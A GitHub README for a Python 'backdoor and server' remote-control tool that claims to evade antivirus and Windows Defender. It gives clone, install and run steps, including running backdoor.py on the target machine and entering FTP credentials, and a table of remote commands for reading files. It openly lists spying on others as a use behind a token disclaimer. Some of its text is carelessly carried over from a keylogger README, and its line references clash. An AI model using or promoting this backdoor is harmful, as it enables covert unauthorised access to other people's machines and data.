## Backdoor-And-Serverr 🖥️🔍

This is a simple server-client Python application that allows you to remotely execute basic commands on the server from the backdoor. 

We can use this project to establish a connection between a server and backdoor , this code is personally crafted and succesful in bypassing the antivirus and windows defender 🍴✨



## Warning ⚠️☠️

**This project is intended for educational and research purposes only.**

Please use this code responsibly and only on devices and systems for which you have explicit authorization.

The author of this project are not responsible for any misuse or illegal activities involving this software.


## Installation Process 📥

First, clone the repository and navigate to the Keylogger directory:

```
$ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
```

Next, install Keylogger using pip3 with the following instructions:

For **Server.py**
```
$ pip install -r requirements.txt
```
For **Backdoor.py**
```
$ pip install -r requirements.txt
```

## Pre Execution ⏮️

On line number **36** of **server.py** file
```
36. ftp=FTP('xx.xxx.xx.xx') #replace 'xx.xxx.xx.xx'
```
On line number **36** of **backdoor.py** file
```
37. ftp.login('username','password')  #replace 'username' 'password'
```

## Execution 🏃‍♂️

Run the backdoor.py script on the machine you want to control:
```
python backdoor.py
```
Run the server.py script on the machine from which you want to control the server:
```
python server.py
```
This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜

## Available Commands

Here's a table of the commands you can run on the server from the client:

| Command     | Description                   |
|-------------|-------------------------------|
| `ls`        | List files and directories    |
| `pwd`       | Print current working directory |
| `cd <dir>`  | Change current directory       |
| `cat <file>`| Display the contents of a file|
| `help`      | Show available commands       |
| `exit`      | Terminate the connection      |


## Potential Uses 💡

Keyloggers can be used for:

- Personal Control and File Backup: Ensure no one is using your computer in your absence. 🔒💼
- Self Analysis: Verify if your system is being accessed by someone else. 🕵️‍♂️💻
- Malicious Intent: Spy on other systems and users (Not recommended). 👀🚫"
